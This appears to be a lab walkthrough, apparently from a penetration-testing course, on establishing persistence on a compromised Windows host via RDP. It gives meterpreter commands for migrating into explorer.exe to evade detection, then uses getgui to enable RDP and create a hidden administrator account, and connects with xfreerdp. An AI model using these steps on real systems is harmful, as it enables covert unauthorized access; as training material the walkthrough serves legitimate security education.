In this case, we have penetrated a system and wish to establish persistence throught rdp. 
We will enable RDP, create an user account, and hide it so we can log in at any time!

We start by migrating the process in explorer.exe. This will hide what we are doing and make it harder to detect.
First, search for the PID of explorer.exe and use the migrate command to migrate the current process in that process.


-ps -S explorer.exe
-migrate <puid>

We have successfully migrated into the explorer.exe process. We are going to maintain access by RDP. We will be creating a user and adding that user to the Administrators group. All this can be done using the "getgui" meterpreter command.

The ‘getgui’ command makes the below changes to the target machine:

Enable RDP service if it’s disabled
Creates new user for an attacker
Hide user from Windows Login screen
Adding created user to "Remote Desktop Users" and "Administrators" groups

-run getgui -e -u alice -p hack_123321

We have created an “alice” user on the target machine and enabled RDP access.
Access the GUI using the xfreerdp utility.

-xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local

Y [Accept the certificate]
